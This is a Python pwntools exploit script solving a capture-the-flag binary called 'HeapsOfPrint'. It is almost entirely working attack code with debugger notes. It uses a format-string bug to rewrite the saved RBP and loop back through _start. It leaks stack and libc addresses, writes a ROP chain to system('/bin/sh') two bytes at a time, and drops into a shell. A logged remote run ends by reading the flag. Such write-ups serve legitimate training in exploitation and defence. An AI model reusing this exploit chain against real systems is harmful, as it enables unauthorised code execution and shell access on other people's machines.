#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=False, terminal=['tmux', 'neww'])
env = {}

if args['GDB']:
    io = gdb.debug(
        './HeapsOfPrint',
        env=env,
        gdbscript='''\
        b *0x5555555548a8
        ignore 1 10
        b *0x555555554984
        ignore 2 10
        c
    ''')
    elf, libc = io.elf, io.libc
elif args['REMOTE']:
    io = remote('flatearth.fluxfingers.net', 1747)
    elf, libc = ELF('./HeapsOfPrint'), ELF('./libc.so.6')
else:
    io = process('./HeapsOfPrint', env=env)
    elf, libc = io.elf, io.libc

# pwndbg> telescope 0x7fffffffed00
# 00:0000│   0x7fffffffed00 —▸ 0x7fffffffed08 ◂— 0x0
# 01:0008│   0x7fffffffed08 ◂— 0x0
# . . .
# 06:0030│   0x7fffffffed30 —▸ 0x7fffffffed00 —▸ 0x7fffffffed08 ◂— 0x0

# the idea for solving the challenge came from looking at this section of the stack:
# we can access locations 0x7fffffffed00 and 0x7fffffffed30 through format strings
# to write arbitrary values into 0x7fffffffed08 and e.g. successive addresses

# TL;DR

###############################################################################

# leak the least significative byte of a variable in the stack
io.recvuntil('My favourite character is ')
stack_lsb_leak = u64(io.recvn(1).ljust(8, '\x00'))  # 0x7fffffffed37
success('stack_lsb_leak: %s' % hex(stack_lsb_leak))
io.recvuntil('Is it?')

# pwndbg> telescope $rsp-0x20 40
# 00:0000│          0x7fffffffed00 ◂— 0x400
# 01:0008│          0x7fffffffed08 —▸ 0x555555554770 (_start) ◂— xor    ebp, ebp
# . . .
# 04:0020│ rbp rsp  0x7fffffffed20 —▸ 0x7fffffffed40 —▸ 0x7fffffffed70 —▸ 0x555555554990 (__libc_csu_init) ◂— ...
# . . .
# 08:0040│          0x7fffffffed40 —▸ 0x7fffffffed70 —▸ 0x555555554990 (__libc_csu_init) ◂— push   r1

# use the format string to modify the last byte of saved RBP at 0x7fffffffed40 to point to 0x7fffffffed08-0x8
# in this way, _start() will be executed when main() returns
new_saved_rbp_lsb = (stack_lsb_leak - 0x7) + ((0x7fffffffed08 - 0x8) - 0x7fffffffed30)
if new_saved_rbp_lsb < 0: error('Bad ASLR luck! Try again')

# also, use the same format string to leak an address of the stack and one of libc

io.sendline('{}%6$hhn%6$p%17$p'.format('' if new_saved_rbp_lsb == 0x0 else '%{}x'.format(
    new_saved_rbp_lsb)))

io.recvn(new_saved_rbp_lsb)

# receive the stack leak
stack_leak = int(io.recvn(14), 16)  # 0x7fffffffed40
success('stack_leak: %s' % hex(stack_leak))

# receive the libc leak and compute the base address
libc_leak = int(io.recvn(14), 16)  # 0x7ffff7a303f1 (__libc_start_main+241)
if args['REMOTE']:
    # ./libc.so.6                       __libc_start_main+240
    libc.address = libc_leak - 0x0000000000020740 - 240
else:
    # ./libc6_2.24-9ubuntu2.2_amd64     __libc_start_main+241
    libc.address = libc_leak - 0x0000000000020300 - 241
success('libc.address: %s' % hex(libc.address))

# now that the address of libc is known, build the ROP chain
rop = ROP(libc)
rop.system(next(libc.search('/bin/sh')))
raw_rop = str(rop)
pop_rdi_ret = u64(raw_rop[:8])
bin_sh_address = u64(raw_rop[8:16])
system_address = u64(raw_rop[16:24])

# compute the stack address where the ROP will be stored
rop_stack_address = stack_leak + (0x7fffffffed08 - 0x7fffffffed40)

###############################################################################

# _start() got executed and we are back in main()

# again, use the format string to modify the last byte of saved RBP so to
# execute _start() again when main() returns
# in addition, use the format string to also write two bytes of the ROP chain at a time

# repeat the process multiple times to write the full ROP


def exec_format_string_and_back_to__start(_start_address, target_value, target_address, n_param1,
                                          n_param2):
    new_saved_rbp_lsb = _start_address & 0xffff
    a = new_saved_rbp_lsb
    b = target_value - a if target_value > a else 0x10000 + target_value - a
    c = target_address - target_value if target_address > target_value else 0x10000 + target_address - target_value
    io.sendline('%{a}x%6$hn%{b}x%{n_param1}$hn%{c}x%{n_param2}$hhn'.format(
        a=a, b=b, c=c, n_param1=n_param1, n_param2=n_param2))


# compute the address of _start() in the stack and indexes for direct parameter access in format strings
_start_address = stack_leak + ((0x7fffffffec70 - 0x8) - 0x7fffffffed40)
n_param1 = 42
n_param2 = 48

curr_rop_address = rop_stack_address
for gadget_address in (pop_rdi_ret, bin_sh_address, system_address):
    for i in range(3):
        part_of_gadget_address = (gadget_address >> (16 * i)) & 0xffff
        next_address = (curr_rop_address + 2**(i + 1)) & 0xff
        exec_format_string_and_back_to__start(_start_address, part_of_gadget_address, next_address,
                                              n_param1, n_param2)
        # _start() got executed and we are back in main
        # adjust offsets for the next execution
        _start_address -= 0x90
        n_param1 += 18
        n_param2 += 18
    curr_rop_address += 0x8

###############################################################################

# modify for the last time the saved RBP to jump to the ROP when current main() returns
new_saved_rbp_lsb = (rop_stack_address - 0x8) & 0xffff

io.sendline('%{}x%6$hn'.format(new_saved_rbp_lsb))

io.interactive()

# $ ./HeapsOfPrint.py REMOTE
# [+] Opening connection to flatearth.fluxfingers.net on port 1747: Done
# [*] '/home/ubuntu/vbox/HeapsOfPrint'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] '/home/ubuntu/vbox/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] stack_lsb_leak: 0x57
# [+] stack_leak: 0x7ffc0a077460
# [+] libc.address: 0x7f65f47cb000
# . . .
#          1$ ls
# flag
# HeapsOfPrint
# setup.sh
# $ cat flag
# FLAG{dr4w1ng_st4ckfr4m3s_f0r_fun_4nd_pr0f1t}
